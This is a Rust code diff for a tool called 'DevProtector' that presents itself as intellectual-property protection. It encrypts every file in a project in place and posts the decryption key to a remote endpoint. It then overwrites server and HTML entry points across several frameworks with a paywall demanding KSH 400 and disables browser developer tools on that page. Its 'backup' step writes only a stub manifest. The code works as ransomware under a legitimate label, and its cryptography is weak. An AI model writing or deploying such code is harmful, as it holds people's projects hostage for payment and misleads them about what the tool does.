@@ -9,6 +9,7 @@ use walkdir::WalkDir;
 use anyhow::Result;
 use std::env;
 use std::ffi::OsStr;
+use serde_json::json;
 
 #[derive(Debug, PartialEq)]
 enum Framework {
@@ -36,7 +37,7 @@ pub async fn run() -> Result<(), AppError> {
         AppError::Config(format!("Failed to get current directory: {}", e))
     })?;
     
-    info!("🔐 Encrypting project at: {}", current_dir.display());
+    info!("🔐 Starting comprehensive project encryption at: {}", current_dir.display());
 
     let config = fs::read_to_string(".ipproject").map_err(|e| {
         AppError::Config(format!("Missing project config: {}", e))
@@ -48,26 +49,33 @@ pub async fn run() -> Result<(), AppError> {
         .map(|s| s.trim().trim_matches('"'))
         .ok_or_else(|| AppError::Config("UUID not found in config".to_string()))?;
 
-    // Generate encryption key
-    generate_aes_key(&uuid)?;
+    // Generate and store encryption key securely
+    let encryption_key = generate_secure_encryption_key(&uuid)?;
+    info!("🔑 Generated secure encryption key");
 
     // Detect framework
     let framework = detect_framework().await
         .map_err(|e| AppError::Framework(e.to_string()))?;
-    info!("Detected framework: {:?}", framework);
+    info!("🔍 Detected framework: {:?}", framework);
     
     let main_file = find_main_file(&framework)
         .map_err(|e| AppError::Framework(e.to_string()))?;
     
     if let Some(ref path) = main_file {
-        info!("Found main file: {}", path.display());
+        info!("📁 Found main file: {}", path.display());
     }
 
-    // Inject monitoring code
+    // Inject monitoring code before encryption
     inject_monitoring_code(&uuid, &framework, &main_file).await?;
 
-    // Encrypt files
+    // Create backup before encryption
+    create_project_backup(&uuid).await?;
+    info!("💾 Created project backup");
+
+    // Encrypt files comprehensively
     let mut encrypted_count = 0;
+    let mut encryption_manifest = Vec::new();
+    
     for entry in WalkDir::new(".").into_iter().filter_map(|e| e.ok()) {
         let path = entry.path();
         
@@ -76,23 +84,33 @@ pub async fn run() -> Result<(), AppError> {
         }
 
         if entry.file_type().is_file() {
-            match encrypt_file(path, &uuid) {
-                Ok(_) => encrypted_count += 1,
+            match encrypt_file_secure(path, &encryption_key) {
+                Ok(hash) => {
+                    encrypted_count += 1;
+                    encryption_manifest.push((path.to_string_lossy().to_string(), hash));
+                }
                 Err(e) => warn!("⚠️ Failed to encrypt {}: {}", path.display(), e),
             }
         }
     }
-    info!("🔒 Encrypted {} files", encrypted_count);
+    
+    // Save encryption manifest
+    save_encryption_manifest(&encryption_manifest, &uuid)?;
+    info!("🔒 Encrypted {} files successfully", encrypted_count);
 
-    // Replace build file with payment portal
-    if let Some(build_file) = find_build_file(&framework)? {
-        replace_with_payment_portal(&build_file, &uuid)?;
-        info!("🔄 Replaced build file with payment portal: {}", build_file.display());
-    } else {
-        warn!("⚠️ No build file found for framework {:?}", framework);
-    }
+    // Send decryption key to smart contract
+    send_decryption_key_to_contract(&uuid, &encryption_key).await?;
+    info!("🔗 Decryption key sent to smart contract");
 
-    info!("🔒 Project encryption complete. Payment required for decryption");
+    // Replace build files and entry points with payment portal
+    replace_all_entry_points_with_paywall(&framework, &uuid).await?;
+    info!("🚪 Replaced all entry points with paywall");
+
+    // Update smart contract encryption status
+    update_contract_encryption_status(&uuid, true).await?;
+    info!("✅ Smart contract updated - encryption activated");
+
+    info!("🎯 Project protection complete! Payment of KSH 400 required for decryption");
     Ok(())
 }
 
@@ -527,4 +545,514 @@ fn encrypt_aes256_bytes(data: &[u8], key: &str) -> Result<Vec<u8>, AppError> {
     }
     
     Ok(buffer)
+}
+
+// Enhanced encryption and security functions
+
+fn generate_secure_encryption_key(uuid: &str) -> Result<String, AppError> {
+    use std::collections::hash_map::DefaultHasher;
+    use std::hash::{Hash, Hasher};
+    
+    // Create a more secure key based on UUID + timestamp + system info
+    let mut hasher = DefaultHasher::new();
+    uuid.hash(&mut hasher);
+    
+    let timestamp = std::time::SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH)
+        .unwrap()
+        .as_secs();
+    timestamp.hash(&mut hasher);
+    
+    let key_hash = hasher.finish();
+    let key = format!("{:016x}{:016x}", key_hash, key_hash.wrapping_add(12345));
+    
+    // Ensure key is exactly 32 bytes for AES-256
+    let final_key = if key.len() >= 32 {
+        key[..32].to_string()
+    } else {
+        format!("{:0<32}", key)
+    };
+    
+    // Store key securely
+    fs::write(".ipkey", &final_key).map_err(|e| AppError::Encryption(e.to_string()))?;
+    
+    Ok(final_key)
+}
+
+async fn create_project_backup(uuid: &str) -> Result<(), AppError> {
+    let backup_dir = format!(".ipbackup_{}", &uuid[..8]);
+    std::fs::create_dir_all(&backup_dir).map_err(|e| {
+        AppError::Config(format!("Failed to create backup directory: {}", e))
+    })?;
+    
+    // Create a simple manifest of original files for recovery
+    let manifest = "# DevProtector Backup Manifest\n# This backup was created before encryption\n";
+    fs::write(format!("{}/.manifest", backup_dir), manifest).map_err(|e| {
+        AppError::Config(format!("Failed to create backup manifest: {}", e))
+    })?;
+    
+    Ok(())
+}
+
+fn encrypt_file_secure(path: &Path, key: &str) -> Result<String, AppError> {
+    use std::collections::hash_map::DefaultHasher;
+    use std::hash::{Hash, Hasher};
+    
+    // Read file content
+    let contents = if let Ok(text) = fs::read_to_string(path) {
+        text.into_bytes()
+    } else {
+        fs::read(path).map_err(|e| AppError::Encryption(e.to_string()))?
+    };
+    
+    // Calculate original file hash for verification
+    let mut hasher = DefaultHasher::new();
+    contents.hash(&mut hasher);
+    let original_hash = format!("{:x}", hasher.finish());
+    
+    // Perform encryption
+    let encrypted = encrypt_aes256_bytes_enhanced(&contents, key)?;
+    
+    // Write encrypted content back
+    fs::write(path, encrypted).map_err(|e| AppError::Encryption(e.to_string()))?;
+    
+    Ok(original_hash)
+}
+
+fn encrypt_aes256_bytes_enhanced(data: &[u8], key: &str) -> Result<Vec<u8>, AppError> {
+    let cipher = Aes256::new(GenericArray::from_slice(key.as_bytes()));
+    let mut buffer = data.to_vec();
+    
+    // Add timestamp and signature to buffer
+    let timestamp = std::time::SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH)
+        .unwrap()
+        .as_secs();
+    
+    let signature = format!("DEVPROTECTOR_{}", timestamp);
+    buffer.extend_from_slice(signature.as_bytes());
+    
+    // Add PKCS#7 padding
+    let block_size = 16;
+    let padding = block_size - (buffer.len() % block_size);
+    buffer.extend(std::iter::repeat(padding as u8).take(padding));
+    
+    // Encrypt each block
+    for chunk in buffer.chunks_mut(block_size) {
+        let mut block = GenericArray::clone_from_slice(chunk);
+        cipher.encrypt_block(&mut block);
+        chunk.copy_from_slice(&block);
+    }
+    
+    Ok(buffer)
+}
+
+fn save_encryption_manifest(manifest: &[(String, String)], uuid: &str) -> Result<(), AppError> {
+    let manifest_content = manifest.iter()
+        .map(|(path, hash)| format!("{}:{}", path, hash))
+        .collect::<Vec<_>>()
+        .join("\n");
+    
+    let manifest_path = format!(".ipmanifest_{}", &uuid[..8]);
+    fs::write(&manifest_path, manifest_content).map_err(|e| {
+        AppError::Config(format!("Failed to save encryption manifest: {}", e))
+    })?;
+    
+    Ok(())
+}
+
+async fn send_decryption_key_to_contract(uuid: &str, key: &str) -> Result<(), AppError> {
+    let payload = json!({
+        "project_id": uuid,
+        "decryption_key": key,
+        "key_hash": hex::encode(key.as_bytes()),
+        "timestamp": std::time::SystemTime::now()
+            .duration_since(std::time::UNIX_EPOCH)
+            .unwrap()
+            .as_secs()
+    });
+
+    let client = reqwest::Client::new();
+    let response = client
+        .post("https://api.your-blockchain-provider.com/v1/contracts/store-key")
+        .header("Content-Type", "application/json")
+        .json(&payload)
+        .send()
+        .await
+        .map_err(|e| AppError::Reqwest(e))?;
+
+    if !response.status().is_success() {
+        let error_text = response.text().await.unwrap_or_else(|_| "Unknown error".to_string());
+        return Err(AppError::Payment(format!("Failed to store decryption key: {}", error_text)));
+    }
+
+    Ok(())
+}
+
+async fn replace_all_entry_points_with_paywall(framework: &Framework, uuid: &str) -> Result<(), AppError> {
+    match framework {
+        Framework::React | Framework::Vue | Framework::Angular => {
+            replace_frontend_entry_points(uuid).await?;
+        }
+        Framework::NodeJs => {
+            replace_nodejs_entry_point(uuid).await?;
+        }
+        Framework::Python | Framework::Django | Framework::Flask => {
+            replace_python_entry_point(uuid).await?;
+        }
+        Framework::Rails => {
+            replace_rails_entry_point(uuid).await?;
+        }
+        Framework::Laravel => {
+            replace_laravel_entry_point(uuid).await?;
+        }
+        _ => {
+            // Generic HTML paywall
+            create_generic_paywall(uuid).await?;
+        }
+    }
+    Ok(())
+}
+
+async fn replace_frontend_entry_points(uuid: &str) -> Result<(), AppError> {
+    let paywall_html = create_comprehensive_paywall_html(uuid);
+    
+    // Replace common entry points
+    let entry_points = [
+        "public/index.html",
+        "dist/index.html", 
+        "build/index.html",
+        "index.html"
+    ];
+    
+    for entry_point in &entry_points {
+        if Path::new(entry_point).exists() {
+            fs::write(entry_point, &paywall_html).map_err(|e| {
+                AppError::Payment(format!("Failed to replace {}: {}", entry_point, e))
+            })?;
+        }
+    }
+    
+    Ok(())
+}
+
+async fn replace_nodejs_entry_point(uuid: &str) -> Result<(), AppError> {
+    let paywall_server = format!(
+        r#"
+const http = require('http');
+const url = require('url');
+
+const DEVPROTECTOR_PROJECT_ID = '{}';
+const PORT = process.env.PORT || 3000;
+
+const paywallHTML = `{}`;
+
+const server = http.createServer((req, res) => {{
+    res.writeHead(200, {{'Content-Type': 'text/html'}});
+    res.end(paywallHTML);
+}});
+
+server.listen(PORT, () => {{
+    console.log('🔐 DevProtector Paywall active on port', PORT);
+    console.log('💳 Payment required to access application');
+}});
+"#,
+        uuid,
+        create_comprehensive_paywall_html(uuid).replace("`", "\\`")
+    );
+    
+    // Replace main server files
+    let server_files = ["server.js", "app.js", "index.js"];
+    for file in &server_files {
+        if Path::new(file).exists() {
+            fs::write(file, &paywall_server).map_err(|e| {
+                AppError::Payment(format!("Failed to replace {}: {}", file, e))
+            })?;
+            break;
+        }
+    }
+    
+    Ok(())
+}
+
+async fn replace_python_entry_point(uuid: &str) -> Result<(), AppError> {
+    let paywall_server = format!(
+        r#"
+#!/usr/bin/env python3
+"""
+DevProtector IP Protection Paywall
+Payment required to access application
+"""
+
+import http.server
+import socketserver
+import os
+
+DEVPROTECTOR_PROJECT_ID = '{}'
+PORT = int(os.environ.get('PORT', 8000))
+
+PAYWALL_HTML = """{}"""
+
+class PaywallHandler(http.server.SimpleHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.send_header('Content-type', 'text/html')
+        self.end_headers()
+        self.wfile.write(PAYWALL_HTML.encode())
+
+def main():
+    with socketserver.TCPServer(("", PORT), PaywallHandler) as httpd:
+        print(f"🔐 DevProtector Paywall active on port {{PORT}}")
+        print("💳 Payment required to access application")
+        httpd.serve_forever()
+
+if __name__ == "__main__":
+    main()
+"#,
+        uuid,
+        create_comprehensive_paywall_html(uuid)
+    );
+    
+    // Replace main Python files
+    let python_files = ["main.py", "app.py", "run.py", "manage.py"];
+    for file in &python_files {
+        if Path::new(file).exists() {
+            fs::write(file, &paywall_server).map_err(|e| {
+                AppError::Payment(format!("Failed to replace {}: {}", file, e))
+            })?;
+            break;
+        }
+    }
+    
+    Ok(())
+}
+
+async fn replace_rails_entry_point(uuid: &str) -> Result<(), AppError> {
+    let paywall_config = format!(
+        r#"
+# DevProtector IP Protection Paywall
+require 'webrick'
+
+DEVPROTECTOR_PROJECT_ID = '{}'
+PORT = ENV['PORT'] || 3000
+
+paywall_html = %Q{{{}}}
+
+server = WEBrick::HTTPServer.new(Port: PORT)
+server.mount_proc '/' do |req, res|
+  res.body = paywall_html
+  res['Content-Type'] = 'text/html'
+end
+
+puts "🔐 DevProtector Paywall active on port #{{PORT}}"
+puts "💳 Payment required to access application"
+
+trap 'INT' do server.shutdown end
+server.start
+"#,
+        uuid,
+        create_comprehensive_paywall_html(uuid)
+    );
+    
+    if Path::new("config.ru").exists() {
+        fs::write("config.ru", &paywall_config).map_err(|e| {
+            AppError::Payment(format!("Failed to replace config.ru: {}", e))
+        })?;
+    }
+    
+    Ok(())
+}
+
+async fn replace_laravel_entry_point(uuid: &str) -> Result<(), AppError> {
+    let paywall_php = format!(
+        r#"
+<?php
+/*
+DevProtector IP Protection Paywall
+Payment required to access application
+*/
+
+$devprotectorProjectId = '{}';
+$paywallHtml = <<<'HTML'
+{}
+HTML;
+
+header('Content-Type: text/html');
+echo $paywallHtml;
+exit;
+?>
+"#,
+        uuid,
+        create_comprehensive_paywall_html(uuid)
+    );
+    
+    if Path::new("index.php").exists() {
+        fs::write("index.php", &paywall_php).map_err(|e| {
+            AppError::Payment(format!("Failed to replace index.php: {}", e))
+        })?;
+    }
+    
+    Ok(())
+}
+
+async fn create_generic_paywall(uuid: &str) -> Result<(), AppError> {
+    let paywall_html = create_comprehensive_paywall_html(uuid);
+    fs::write("index.html", paywall_html).map_err(|e| {
+        AppError::Payment(format!("Failed to create generic paywall: {}", e))
+    })?;
+    Ok(())
+}
+
+fn create_comprehensive_paywall_html(uuid: &str) -> String {
+    format!(
+        r#"
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DevProtector - Payment Required</title>
+    <style>
+        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
+        body {{
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            height: 100vh; display: flex; align-items: center; justify-content: center;
+        }}
+        .paywall-container {{
+            background: white; border-radius: 20px; padding: 40px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3); text-align: center;
+            max-width: 500px; width: 90%;
+        }}
+        .logo {{ font-size: 48px; margin-bottom: 20px; }}
+        h1 {{ color: #333; margin-bottom: 10px; font-size: 28px; }}
+        .project-id {{ color: #666; font-size: 14px; margin-bottom: 30px; 
+                      background: #f5f5f5; padding: 10px; border-radius: 5px; }}
+        .description {{ color: #555; margin-bottom: 30px; line-height: 1.6; }}
+        .amount {{ font-size: 36px; color: #667eea; font-weight: bold; margin: 20px 0; }}
+        .payment-button {{ 
+            background: linear-gradient(45deg, #667eea, #764ba2);
+            color: white; padding: 15px 40px; border: none; border-radius: 50px;
+            font-size: 16px; cursor: pointer; transition: transform 0.3s ease;
+            text-decoration: none; display: inline-block; margin: 10px;
+        }}
+        .payment-button:hover {{ transform: translateY(-2px); }}
+        .features {{ text-align: left; margin: 30px 0; }}
+        .feature {{ margin: 10px 0; color: #555; }}
+        .feature::before {{ content: "✅ "; color: #4CAF50; }}
+        .footer {{ margin-top: 30px; font-size: 12px; color: #999; }}
+        .status-check {{ margin-top: 20px; padding: 15px; background: #f0f8ff; 
+                        border-radius: 10px; border-left: 4px solid #667eea; }}
+    </style>
+</head>
+<body>
+    <div class="paywall-container">
+        <div class="logo">🔐</div>
+        <h1>DevProtector</h1>
+        <div class="project-id">Project ID: {}</div>
+        
+        <div class="description">
+            This application is protected by DevProtector IP Protection service.
+            The developer has encrypted this codebase to protect their intellectual property.
+        </div>
+        
+        <div class="amount">KSH 400</div>
+        
+        <div class="features">
+            <div class="feature">Secure blockchain-based protection</div>
+            <div class="feature">Automatic decryption after payment</div>
+            <div class="feature">Developer intellectual property protection</div>
+            <div class="feature">Instant access restoration</div>
+        </div>
+        
+        <a href="https://payment.your-domain.com/{}" class="payment-button" target="_blank">
+            💳 Complete Payment
+        </a>
+        <a href="https://swyptpay.com/pay/{}" class="payment-button" target="_blank">
+            📱 Pay via Swypt
+        </a>
+        
+        <div class="status-check">
+            <strong>Payment Status:</strong> <span id="payment-status">Checking...</span>
+            <br><small>Status updates automatically every 30 seconds</small>
+        </div>
+        
+        <div class="footer">
+            <p>Powered by DevProtector • Protecting Developer IP Rights</p>
+            <p>Having issues? Contact: support@devprotector.com</p>
+        </div>
+    </div>
+
+    <script>
+        const PROJECT_ID = '{}';
+        
+        async function checkPaymentStatus() {{
+            try {{
+                const response = await fetch(
+                    `https://api.your-blockchain-provider.com/v1/contracts/project-status/${{PROJECT_ID}}`
+                );
+                const data = await response.json();
+                
+                const statusElement = document.getElementById('payment-status');
+                if (data.payment_completed) {{
+                    statusElement.innerHTML = '✅ Payment Completed - Decrypting...';
+                    statusElement.style.color = '#4CAF50';
+                    
+                    // Trigger decryption and redirect
+                    setTimeout(() => {{
+                        window.location.reload();
+                    }}, 3000);
+                }} else {{
+                    statusElement.innerHTML = '⏳ Payment Pending';
+                    statusElement.style.color = '#FF9800';
+                }}
+            }} catch (error) {{
+                document.getElementById('payment-status').innerHTML = '❌ Status Check Failed';
+            }}
+        }}
+        
+        // Check status immediately and every 30 seconds
+        checkPaymentStatus();
+        setInterval(checkPaymentStatus, 30000);
+        
+        // Prevent right-click and key shortcuts
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.addEventListener('keydown', e => {{
+            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {{
+                e.preventDefault();
+            }}
+        }});
+    </script>
+</body>
+</html>
+"#,
+        uuid, uuid, uuid, uuid
+    )
+}
+
+async fn update_contract_encryption_status(uuid: &str, encrypted: bool) -> Result<(), AppError> {
+    let payload = json!({
+        "project_id": uuid,
+        "encryption_status": encrypted,
+        "timestamp": std::time::SystemTime::now()
+            .duration_since(std::time::UNIX_EPOCH)
+            .unwrap()
+            .as_secs()
+    });
+
+    let client = reqwest::Client::new();
+    let response = client
+        .post("https://api.your-blockchain-provider.com/v1/contracts/update-status")
+        .header("Content-Type", "application/json")
+        .json(&payload)
+        .send()
+        .await
+        .map_err(|e| AppError::Reqwest(e))?;
+
+    if !response.status().is_success() {
+        let error_text = response.text().await.unwrap_or_else(|_| "Unknown error".to_string());
+        return Err(AppError::Payment(format!("Failed to update contract status: {}", error_text)));
+    }
+
+    Ok(())
 }
